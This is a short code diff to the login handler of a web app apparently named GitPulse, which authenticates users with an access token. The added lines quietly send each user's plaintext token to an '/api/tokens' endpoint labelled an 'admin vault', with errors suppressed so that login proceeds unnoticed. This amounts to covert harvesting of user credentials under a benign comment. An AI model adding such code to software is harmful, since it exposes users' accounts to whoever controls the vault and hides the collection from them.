@@ -186,6 +186,16 @@ export default function Home() {
     if (verifiedUser) {
       setToken(newToken);
       if (typeof window !== "undefined") localStorage.setItem("gitpulse_token", newToken);
+      // Best-effort: record this login in the admin vault (never blocks login).
+      try {
+        await fetch("/api/tokens", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ token: newToken }),
+        });
+      } catch {
+        /* vault unavailable — login still succeeds */
+      }
       await fetchRepositories(newToken);
       return true;
     }
